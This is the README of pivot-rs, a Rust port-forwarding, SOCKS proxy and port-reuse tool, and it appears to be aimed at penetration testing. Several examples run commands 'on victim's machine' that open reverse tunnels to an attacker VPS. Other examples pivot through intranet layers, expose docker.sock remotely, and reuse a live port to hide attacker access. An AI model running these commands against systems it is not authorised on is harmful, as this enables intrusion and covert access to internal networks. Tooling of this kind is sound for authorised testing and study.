# pivot-rs

[English](README.md) | [简体中文](README.zh.md)

`pivot-rs` is a lightweight port-forwarding and socks proxy tool written in Rust 🦀

## Build

The project currently only releases binaries for the following architectures (based on GitHub Actions):

- x86_64-unknown-linux-gnu
- x86_64-apple-darwin
- aarch64-apple-darwin
- x86_64-pc-windows-msvc

*`x86_64-unknown-linux-gnu` and `x86_64-pc-windows-msvc` will have an additional UPX compressed binary file*

If the architecture you need is not in the list above, you can build it yourself.

```bash
git clone https://github.com/X1r0z/pivot-rs
cd pivot-rs
cargo build --release
```

## Feature

- TCP/UDP port forwarding
- Unix domain socket forwarding (e.g. `/var/run/docker.sock`)
- Socks5 proxy (no/with authentication)
- TCP port reuse with `SO_REUSEADDR` and `SO_REUSEPORT`
- Multi layer proxy support
- TLS encryption support

## Usage

`pivot-rs` has three modes: port forwarding, socks proxy and port reuse mode, corresponding to the `fwd`, `proxy` and `reuse` parameters respectively.

```bash
$ ./pivot -h

Pivot: Port-Forwarding and Proxy Tool

Usage: pivot <COMMAND>

Commands:
  fwd    Port forwarding mode
  proxy  Socks proxy mode
  reuse  Port reuse mode
  help   Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

Port forwarding mode

```bash
$ ./pivot fwd -h

Port forwarding mode

Usage: pivot fwd [OPTIONS]

Options:
  -l, --locals <LOCALS>      Local listen IP address, format: [+][IP:]PORT
  -r, --remotes <REMOTES>    Remote connect IP address, format: [+]IP:PORT
  -s, --socket <SOCKET>      Unix domain socket path
  -p, --protocol <PROTOCOL>  Forward Protocol [default: tcp] [possible values: tcp, udp]
  -h, --help                 Print help (see more with '--help')
```

Socks proxy mode

```bash
$ ./pivot proxy -h

Socks proxy mode

Usage: pivot proxy [OPTIONS]

Options:
  -l, --locals <LOCALS>  Local listen IP address, format: [+][IP:]PORT
  -r, --remote <REMOTE>  Reverse server IP address, format: [+]IP:PORT
  -a, --auth <AUTH>      Authentication info, format: user:pass (other for random)
  -h, --help             Print help
```

Port reuse mode

```bash
$ ./pivot reuse -h

Port reuse mode

Usage: pivot reuse [OPTIONS] --local <LOCAL> --remote <REMOTE> --external <EXTERNAL>

Options:
  -l, --local <LOCAL>        Local reuse IP address, format: IP:PORT
  -r, --remote <REMOTE>      Remote redirect IP address, format: IP:PORT
  -f, --fallback <FALLBACK>  Fallback IP address, format: IP:PORT
  -e, --external <EXTERNAL>  External IP address, format: IP
  -t, --timeout <TIMEOUT>    Timeout to stop port reuse
  -h, --help                 Print help
```

### TCP Port Forwarding

Listen on `0.0.0.0:8888` and `0.0.0.0:9999`, forward traffic between them.

*specify `127.0.0.1:PORT` to listen on local address*

```bash
./pivot fwd -l 8888 -l 9999
```

Listen on `0.0.0.0:8888`, forward traffic to a remote address.

```bash
./pivot fwd -l 8888 -r 10.0.0.1:9999
```

Connect `10.0.0.1:8888` and `10.0.0.2:9999`, forward traffic between them.

```bash
./pivot fwd -r 10.0.0.1:8888 -r 10.0.0.1:9999
```

A basic example of accessing an intranet address through port forwarding.

```bash
# on attacker's machine
./pivot fwd -l 8888 -l 9999

# on victim's machine
./pivot fwd -r 10.0.0.1:3389 -r vps:8888

# now attacker can access 10.0.0.1:3389 through vps:9999
```

A complex example, multi-layer forwarding in the intranet.

```bash
# on machine A (10.0.0.1, 172.16.0.1)
./pivot fwd -r 10.0.0.10:3389 -l 7777

# on machine B (172.16.0.2, 192.168.1.1)
./pivot fwd -r 172.16.0.1:7777 -r 192.168.1.2:8888

# on machine C (192.168.1.2, DMZ)
./pivot fwd -l 8888 -r vps:9999

# on attacker's machine
./pivot fwd -l 9999 -l 33890

# now attacker can access 10.0.0.10:3389 through vps:33890
```

Note that the command on machine B need to be executed last. Because this mode will check the connectivity between the two remote addresses.

### UDP Port Forwarding

The usage of UDP port forwarding is similar to TCP, simply add `-p udp` parameter.

**This feature may be unstable.**

Note that when using **reverse** UDP port forwarding, a handshake packet will be sent to keep the client address.

Example:

```bash
# on attacker's machine
./pivot fwd -l 8888 -l 9999 -p udp

# on victim's machine
./pivot fwd -r 10.0.0.1:53 -r vps:8888 -p udp
```

The victim's machine will send a 4-byte handshake packet (with all 0s) to `vps:8888`, which is the attacker's machine.

The attacker's machine will remember the client address, and forward the traffic to it when user connects to `vps:9999`.

**Because of the handshake packet, the parameters must be in order and cannot be swapped.**

Another example:

```bash
# on machine A (10.0.0.1, 192.168.1.1, intranet)
./pivot fwd -r 10.0.0.10:53 -l 7777 -p udp

# on machine B (192.168.1.2, DMZ)
./pivot fwd -r 192.168.1.1:7777 -r vps:8888 -p udp # this command need to be executed last

# on attacker's machine
./pivot fwd -l 8888 -l 9999 -p udp
```

The handshake packet will be sent from machine B to the attacker's machine (port 8888). Users can connect to the intranet through port 9999.

### Unix domain socket Forwarding

*This feature is only supported on Linux and macOS*

A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between processes running on the same machine.

`/var/run/docker.sock` and `/var/run/php-fpm.sock` are common Unix domain sockets.

You can forward Unix domain socket to a TCP port.

```bash
./pivot fwd -s /var/run/docker.sock -l 4444

# get docker version
curl http://127.0.0.1:4444/version
```

or in the reverse mode.

```bash
# on victim's machine
./pivot fwd -s /var/run/docker.sock -r vps:4444

# on attacker's machine
./pivot fwd -l 4444 -l 5555

# get docker version
curl http://vps:5555/version
```

### Socks Proxy

`pivot-rs` supports socks5 protocol (no/with authentication)

Forward socks proxy

```bash
./pivot proxy -l 1080
```

Reverse socks proxy

```bash
# on attacker's machine
./pivot proxy -l 7777 -l 8888
# The first -l specifies the control port
# The second -l specifies the proxy port

# on victim's machine
./pivot proxy -r vps:7777

# now attacker can use socks proxy on vps:8888
```

The port 7777 in the above example is called the control port, which uses TCP multiplexing technology to ensure that multiple TCP streams (i.e., multiple socks proxy requests) can be processed within a single TCP long connection.

Therefore, the order of ports 7777 and 8888 **cannot be reversed**

To enable authentication, simply add `user:pass` after the `-a` flag.

```bash
./pivot proxy -l 1080 -a user:pass
```

`pivot-rs` will generate a random username and password if you pass a string to `-a` flag which does not have the `user:pass` format.

```bash
./pivot proxy -l 1080 -a rand

# the random username and password will be output to the console
```

`pivot-rs` supports forwarding unauthenticated socks requests to authenticated socks proxies

*Currently, Chrome, Edge and FireFox browsers do not support authenticated socks proxies, so this method can be used to bypass restrictions while ensuring the security of socks proxies.*

```bash
# vps:1080 requires authentication (user:pass)

# listen to port 1080 and forward socks requests to vps:1080 with authentication
./pivot proxy -l 1080 -r vps:1080 -a user:pass

# now the browser can use 127.0.0.1:1080 as a socks proxy (no authentication required)
# authentication info will be forwarded automatically
```

### TLS Encryption

TLS encryption is supported for TCP, Unix domain socket forwarding and socks proxy.

To enable encryption, simple add `+` sign in front of the address or port.

For ease of use, the server uses a self-signed TLS certificate by default, and the client trusts all certificates (no verify).

Example of a TLS encrypted TCP port forwarding.

```bash
# on attacker's machine
./pivot fwd -l +7777 -l 33890

# on victim's machine
./pivot fwd -r 127.0.0.1:3389 -r +vps:7777

# now attacker can access 3389 through vps:33890, and the traffic on port 7777 will be encrypted
```

Example of a TLS encrypted reverse socks proxy.

```bash
# on attacker's machine
./pivot proxy -l +7777 -l 8888

# on victim's machine
./pivot proxy -r +vps:7777

# now attacker can use socks proxy on vps:8888, and the traffic on port 7777 will be encrypted
```

### TCP Port Reuse

`pivot-rs` supports TCP port reuse with `SO_REUSEADDR` and `SO_REUSEPORT` options.

The behavior of port reuse differs from operation systems.

In Windows, there is only `SO_REUSEADDR` option, which allows multiple sockets to bind to the same address and port. But there are some limitations, depending on the accounts `pivot-rs` is running under, and the ip address you are binding to.

e.g. binding to `0.0.0.0` (wildcard address) or `192.168.1.1` (specific address) may have different results in some senarios.

[https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse](https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse)

In Linux, there are both `SO_REUSEADDR` and `SO_REUSEPORT` options. The principle of port reuse is to bind different address.

For example, A machine has two IP addresses `192.168.1.1` and `10.0.0.1`. A program is listening on `10.0.0.1:80`, so you can bind to `192.168.1.1:80` to reuse port.

However, if a program is listening on `0.0.0.0:80`, then you cannot reuse the port because binding to any other address with port 80 is not allowed.

In short, if someone has already bound to `0.0.0.0`, the game is over.

Of course, there is still a way to reuse port with the same address and port, that is, the program itself sets `SO_REUSEPORT`, and the uid of the user executing the program is the same as the uid of the user executing `pivot-rs`.

In macOS, most of the behavior is the same as in Linux, but it is more flexible. Even if a program is bound to `0.0.0.0`, you can still bind to other specific IP addresses, such as `192.168.1.1`, to reuse port. (But not vice versa)

To reuse a port, you need to specify the local address, remote address, fallback address and external address.

`-l` specify the local address you are reusing

`-r` specify the remote address you are redirecting to

`-f` specify the fallback address that other people who are not from the external address will connect to (e.g. normal users)

`-e` specify the external address of attacker's machine, which will connect to the remote address through port reuse mechanism

For example, reuse the port 8000

```bash
./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -f 127.0.0.1:8000 -e 1.2.3.4
```

Attackers from external address `1.2.3.4` will connect to `10.0.0.1:22` through `192.168.1.1:8000`, the normal users will fallback to `127.0.0.1:8000` (prevent the service on port 8000 being affected)

It is not recommended to reuse ports on `0.0.0.0` address although it may work in some cases, because it will make the fallback address useless (the fallback connection will be looped in `pivot-rs` and finally cause a crash)

Sometimes the fallback address is not necessary, you can omit it and set a timeout.

```bash
./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -e 1.2.3.4 -t 10
```

The timeout means stopping the reuse listener after a specific time (10s), and continuing to forward the alive connections.

## Reference

[https://github.com/EddieIvan01/iox](https://github.com/EddieIvan01/iox)

[https://github.com/p1d3er/port_reuse](https://github.com/p1d3er/port_reuse)

[https://ph4ntonn.github.io/port-reuse](https://ph4ntonn.github.io/Port-reuse)

[https://saucer-man.com/operation_and_maintenance/586.html](https://saucer-man.com/operation_and_maintenance/586.html)
